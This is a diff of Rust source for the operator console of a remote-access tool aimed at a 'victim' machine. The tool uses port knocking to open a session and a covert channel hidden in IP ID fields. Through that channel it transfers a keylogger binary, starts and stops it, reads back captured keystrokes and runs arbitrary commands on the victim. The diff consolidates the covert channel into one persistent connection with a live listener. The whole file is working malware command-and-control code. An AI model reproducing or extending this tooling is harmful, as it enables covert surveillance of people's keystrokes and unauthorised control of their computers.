@@ -1,8 +1,8 @@
 use std::io::{self, Write};
-use std::net::{IpAddr, Ipv4Addr}; // Fixed import
+use std::net::{IpAddr, Ipv4Addr};
 use std::thread;
 use std::time::Duration;
-use pnet::datalink;
+use pnet::datalink::{self, Channel};
 
 // Module declarations
 mod port_knkr;
@@ -12,6 +12,7 @@ mod covert;
 
 use port_knkr::KnockSession;
 use pcap_capture::PcapHandle;
+use covert::CovertChannel;
 
 // Command Codes for Covert IPID Channel
 const CMD_START_LOGGER: u8   = 0x10;
@@ -29,8 +30,11 @@ enum SessionState {
 struct Commander {
     state: SessionState,
     victim_ip: Option<Ipv4Addr>,
+    local_ip: Option<Ipv4Addr>,
     knock_session: Option<KnockSession>,
     pcap_handle: Option<PcapHandle>,
+    // Persistent covert channel transmitter
+    covert_chan: Option<CovertChannel>,
 }
 
 impl Commander {
@@ -38,8 +42,10 @@ impl Commander {
         Self {
             state: SessionState::Disconnected,
             victim_ip: None,
+            local_ip: None,
             knock_session: None,
             pcap_handle: None,
+            covert_chan: None,
         }
     }
 
@@ -70,13 +76,10 @@ impl Commander {
         println!("1)  Disconnect from victim");
         println!("2)  Uninstall from victim");
         println!("3)  Transfer keylogger to victim");
-        println!("4)  Start keylogger");
+        println!("4)  Start keylogger (Live sniffing)");
         println!("5)  Stop keylogger");
-        println!("6)  View Captured Keys (from local log)");
+        println!("6)  View Captured Keys (from pcap logs)");
         println!("7)  Transfer file TO victim");
-        println!("8)  Transfer file FROM victim");
-        println!("9)  Watch file");
-        println!("10) Watch directory");
         println!("11) Run program on victim");
 
         match prompt("Selection > ").as_str() {
@@ -86,197 +89,168 @@ impl Commander {
             "4"  => self.start_keylogger(),
             "5"  => self.stop_keylogger(),
             "6"  => self.view_keylog(),
-            "7"  => self.transfer_to(),
-            "8"  => self.transfer_from(),
-            "9"  => self.watch_file(),
-            "10" => self.watch_dir(),
             "11" => self.run_program(),
             _    => println!("[!] Invalid selection"),
         }
     }
 
-    // Helper: Dynamically find the best interface for a target IP
-    fn find_best_interface(target_ip: Ipv4Addr) -> Option<String> {
-        let interfaces = datalink::interfaces();
-        for iface in interfaces {
-            if !iface.is_up() || iface.is_loopback() { continue; }
-            for ip_net in &iface.ips {
-                match ip_net.ip() {
-                    IpAddr::V4(_) => {
-                        if ip_net.contains(IpAddr::V4(target_ip)) {
-                            return Some(iface.name);
-                        }
-                    }
-                    _ => continue,
-                }
-            }
-        }
-        // Fallback to first active physical interface
-        datalink::interfaces().into_iter()
-            .find(|i| i.is_up() && !i.is_loopback())
-            .map(|i| i.name)
-    }
-
     fn initiate_connection(&mut self) {
-        let mut ip_input = prompt("Enter target Victim IP [0.0.0.0]: ");
+        let ip_input = prompt("Enter target Victim IP [default: 127.0.0.1]: ");
+        let target_ip = if ip_input.is_empty() { 
+            "127.0.0.1".parse::<Ipv4Addr>().unwrap() 
+        } else {
+            match ip_input.parse::<Ipv4Addr>() {
+                Ok(ip) => ip,
+                Err(_) => { println!("[!] Invalid IP"); return; }
+            }
+        };
+
+        // 1. Find Interface & Local IP
+        let iface_name = Self::find_best_interface(target_ip).unwrap_or_else(|| "lo".to_string());
+        let interfaces = datalink::interfaces();
+        let interface = interfaces.into_iter().find(|i| i.name == iface_name).unwrap();
         
-        // Handle default value
-        if ip_input.is_empty() {
-            ip_input = "0.0.0.0".to_string();
-        }
+        let local_ip = interface.ips.iter()
+            .find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None })
+            .unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
 
-        match ip_input.parse::<Ipv4Addr>() {
-            Ok(ip) => {
-                self.victim_ip = Some(ip);
+        self.victim_ip = Some(target_ip);
+        self.local_ip = Some(local_ip);
+
+        // 2. Port Knock & Seed Generation
+        // This generates the random ports based on the seed
+        println!("[*] Executing knocking sequence...");
+        match port_knkr::port_knock(target_ip) {
+            Ok(session) => {
+                println!("[+] Port knock active.");
+                println!("[+] Session Established: C2->{} | Victim->{}", session.tx_port, session.rx_port);
                 
-                let iface_name = Self::find_best_interface(ip).unwrap_or_else(|| "lo".to_string());
-                println!("[*] Dynamic interface selection: {}", iface_name);
+                // 3. Initialize Bidirectional Covert Channel
+                // We use the ports generated by the RNG in the KnockSession
+                let (chan, rx) = CovertChannel::new(
+                    &interface, 
+                    target_ip, 
+                    local_ip, 
+                    session.tx_port, // Send TO this port
+                    session.rx_port  // Listen ON this port
+                );
 
-                println!("[*] Starting PCAP listener on {}...", iface_name);
-                self.pcap_handle = Some(PcapHandle::start(&iface_name, ip.to_string()));
-
-                println!("[*] Executing knocking sequence...");
-                match port_knkr::port_knock(ip) {
-                    Ok(session) => {
-                        println!("[+] Port knock successful. Control port: {}", session.control_port);
-                        self.knock_session = Some(session);
-                        self.state = SessionState::Connected;
-                    }
-                    Err(e) => println!("[!] Knock failed: {}", e),
+                self.covert_chan = Some(chan);
+                
+                // 4. Start the Background Listener
+                // This handles incoming data from the victim
+                if let Some(chan_ref) = &self.covert_chan {
+                    covert::start_listening(rx, chan_ref.config.clone());
                 }
+
+                self.knock_session = Some(session);
+                self.state = SessionState::Connected;
             }
-            Err(_) => println!("[!] Invalid IP address format."),
+            Err(e) => println!("[!] Knock failed: {}", e),
         }
     }
 
-    fn disconnect(&mut self) {
-        println!("[*] Closing session...");
-        if let Some(session) = &self.knock_session {
-            session.stop();
-        }
-        self.knock_session = None;
-        self.pcap_handle = None;
-        self.state = SessionState::Disconnected;
-    }
-
-    fn transfer_keylogger(&self) {
-        if let Some(ip) = self.victim_ip {
-            // No build command here—we assume you've already built it!
-
-            // 1. Define where to look (Release first, then Debug)
-            let paths = ["target/release/keylogger_bin", "target/debug/keylogger_bin"];
-            let mut data = None;
-
-            // 2. Try to find the binary
-            for path in paths {
-                if let Ok(bytes) = std::fs::read(path) {
-                    data = Some(bytes);
-                    println!("[*] Found binary at: {}", path);
-                    break;
-                }
-            }
-
-            // 3. Handle the file data
-            let data = match data {
-                Some(d) => d,
-                None => {
-                    println!("[!] Error: keylogger_bin not found in target/debug or target/release.");
-                    println!("[*] Make sure you ran 'cargo build --release' before transferring.");
-                    return;
-                }
-            };
-
-            println!("[*] Transferring keylogger ({} bytes)...", data.len());
-            let mut transmitter = covert::CovertChannel::new(ip);
-
-            // Signal the start of a transfer
-            transmitter.send_byte(CMD_START_TRANSFER);
-            thread::sleep(Duration::from_millis(200));
-
-            for (i, byte) in data.iter().enumerate() {
-                transmitter.send_byte(*byte);
-                // Maintain throttle for reliability over raw sockets
-                thread::sleep(Duration::from_micros(100)); 
-
-                if i % 1000 == 0 { // Increased interval for cleaner output
-                    print!("\r[*] Progress: {}/{}", i, data.len());
-                    io::stdout().flush().unwrap();
-                }
-            }
-
-            transmitter.send_byte(CMD_EOF);
-            println!("\n[+] Transfer complete.");
+    fn start_keylogger(&mut self) {
+        if let Some(ref mut chan) = self.covert_chan {
+            println!("[*] Sending 'START' signal. Live output will appear below:");
+            chan.send_byte(CMD_START_LOGGER);
         }
     }
 
-    fn start_keylogger(&self) {
-        if let Some(ip) = self.victim_ip {
-            println!("[*] Sending 'START' signal...");
-            let mut transmitter = covert::CovertChannel::new(ip);
-            transmitter.send_byte(CMD_START_LOGGER);
-            println!("[+] Keylogger execution triggered.");
-        }
-    }
-
-    fn stop_keylogger(&self) {
-        if let Some(ip) = self.victim_ip {
-            println!("[*] Sending 'STOP' signal...");
-            let mut transmitter = covert::CovertChannel::new(ip);
-            transmitter.send_byte(CMD_STOP_LOGGER);
+    fn stop_keylogger(&mut self) {
+        if let Some(ref mut chan) = self.covert_chan {
+            chan.send_byte(CMD_STOP_LOGGER);
             println!("[+] Stop command sent.");
         }
     }
 
     fn view_keylog(&self) {
-        println!("\n--- Captured Keystrokes (Local Log) ---");
-        match std::fs::read_to_string("captured_keys.txt") {
+        let path = "../data/pcaps/captured_ascii.txt";
+        println!("\n--- Captured Keystrokes (from {}) ---", path);
+        match std::fs::read_to_string(path) {
             Ok(content) => println!("{}", content),
-            Err(_) => println!("[!] No keylog data found."),
+            Err(_) => println!("[!] No keylog data found at that path."),
         }
     }
 
-    fn uninstall(&self) { 
-        if let Some(ip) = self.victim_ip {
-            let mut transmitter = covert::CovertChannel::new(ip);
-            transmitter.send_byte(CMD_UNINSTALL);
-            println!("[*] Uninstall command sent."); 
-        }
-    }
+    fn run_program(&mut self) {
+        let cmd = prompt("Command to run: ");
+        if cmd.is_empty() { return; }
 
-    fn transfer_to(&self) { println!("[*] File transfer TO victim not yet implemented."); }
-    fn transfer_from(&self) { println!("[*] Requesting file from victim..."); }
-    fn watch_file(&self) { println!("[*] Monitoring file..."); }
-    fn watch_dir(&self) { println!("[*] Monitoring directory..."); }
-
-    fn run_program(&self) {
-        if let Some(ip) = self.victim_ip {
-            let cmd = prompt("Command to run: ");
-            if cmd.is_empty() { return; }
-
-            let mut transmitter = covert::CovertChannel::new(ip);
-            
-            // 1. Send the command string
+        if let Some(ref mut chan) = self.covert_chan {
+            println!("[*] Sending command. Watch live output:");
             for byte in cmd.as_bytes() {
-                transmitter.send_byte(*byte);
-                thread::sleep(Duration::from_millis(5)); 
+                chan.send_byte(*byte);
+                thread::sleep(Duration::from_millis(10));
             }
-            transmitter.send_byte(b'\n'); // Tell victim to execute
-            
-            println!("[*] Command sent. Waiting for output...");
+            chan.send_byte(b'\n'); 
+            // Note: We don't need a loop here; PcapHandle thread prints the response!
+        }
+    }
 
-            // 2. Listen for the response
-            loop {
-                // Use the receiver to catch the IPID bytes coming back
-                if let Some((byte, _)) = covert::CovertChannel::receive_byte() {
-                    if byte == 0x04 { // Our EOT signal
-                        break;
-                    }
-                    // Print the byte as a character immediately
-                    print!("{}", byte as char);
+    fn uninstall(&mut self) {
+        if let Some(ref mut chan) = self.covert_chan {
+            chan.send_byte(CMD_UNINSTALL);
+            println!("[*] Uninstall command sent.");
+        }
+    }
+
+    fn disconnect(&mut self) {
+        println!("[*] Closing session...");
+        if let Some(session) = &self.knock_session { session.stop(); }
+        self.knock_session = None;
+        self.pcap_handle = None;
+        self.covert_chan = None;
+        self.state = SessionState::Disconnected;
+    }
+
+    fn find_best_interface(target_ip: Ipv4Addr) -> Option<String> {
+        let interfaces = datalink::interfaces();
+        for iface in interfaces {
+            if !iface.is_up() || iface.is_loopback() { continue; }
+            for ip_net in &iface.ips {
+                if let IpAddr::V4(_) = ip_net.ip() {
+                    if ip_net.contains(IpAddr::V4(target_ip)) { return Some(iface.name); }
+                }
+            }
+        }
+        datalink::interfaces().into_iter()
+            .find(|i| i.is_up() && !i.is_loopback())
+            .map(|i| i.name)
+    }
+
+    fn transfer_keylogger(&mut self) {
+        let paths = ["target/release/keylogger_bin", "target/debug/keylogger_bin"];
+        let mut data = None;
+
+        for path in paths {
+            if let Ok(bytes) = std::fs::read(path) {
+                data = Some(bytes);
+                println!("[*] Found binary at: {}", path);
+                break;
+            }
+        }
+
+        let data = match data {
+            Some(d) => d,
+            None => { println!("[!] Binary not found."); return; }
+        };
+
+        if let Some(ref mut chan) = self.covert_chan {
+            println!("[*] Transferring {} bytes...", data.len());
+            chan.send_byte(CMD_START_TRANSFER);
+            thread::sleep(Duration::from_millis(200));
+
+            for (i, byte) in data.iter().enumerate() {
+                chan.send_byte(*byte);
+                thread::sleep(Duration::from_micros(150)); 
+                if i % 1000 == 0 {
+                    print!("\r[*] Progress: {}/{}", i, data.len());
                     io::stdout().flush().unwrap();
                 }
             }
-            println!("\n[+] Done.");
+            chan.send_byte(CMD_EOF);
+            println!("\n[+] Transfer complete.");
         }
     }
 }
